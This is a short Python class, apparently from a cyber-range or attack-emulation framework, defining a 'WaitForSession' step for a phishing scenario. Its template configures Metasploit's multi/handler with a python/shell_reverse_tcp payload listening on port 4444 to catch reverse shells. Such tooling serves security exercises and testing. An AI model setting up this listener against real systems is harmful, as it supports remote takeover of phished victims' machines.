from .cryton_action import CrytonAction
from cyst.api.logic.metadata import Metadata


class WaitForSession(CrytonAction):
    def __init__(self, message_id: int, metadata: Metadata):
        super().__init__(message_id, metadata)

        self._template = {
            "name": f"phishing-response-{message_id}",
            "step_type": "worker/execute",
            "is_init": True,
            "arguments": {
                "module": "mod_msf",
                "module_arguments": {
                    "module_type": "exploit",
                    "module": "multi/handler",
                    "session_target": "",
                    "module_options": {},
                    "payload": "python/shell_reverse_tcp",
                    "payload_options": {
                        "LHOST": "0.0.0.0",
                        "LPORT": 4444
                    }
                }
            }
        }
